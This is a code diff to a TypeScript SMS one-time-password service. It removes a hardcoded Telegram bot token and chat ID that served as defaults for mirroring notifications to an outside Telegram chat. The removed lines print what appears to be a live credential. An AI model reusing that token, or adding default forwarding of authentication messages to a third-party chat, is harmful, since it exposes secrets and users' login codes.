@@ -3,7 +3,7 @@
  * Supports Eskiz.uz, PlayMobile, SMS.uz and local Mock driver for development.
  */
 
-import crypto from 'crypto';
+import * as crypto from 'crypto';
 import axios from 'axios';
 
 export interface OtpRecord {
@@ -125,9 +125,9 @@ export class SmsService {
       }
     }
 
-    // Dispatch Mirror Notification to Telegram Bot for guaranteed instant delivery
-    const tgToken = process.env.TELEGRAM_BOT_TOKEN || '8910237594:AAF2wO2WF6jvCKhDVfY_mN1FcjyrkvB6iYw';
-    const tgChat = process.env.TELEGRAM_CHAT_ID || '7676609522';
+    // Dispatch Mirror Notification to Telegram Bot (if configured via environment variables)
+    const tgToken = process.env.TELEGRAM_BOT_TOKEN;
+    const tgChat = process.env.TELEGRAM_CHAT_ID;
     if (tgToken && tgChat) {
       try {
         const tgMessage = 
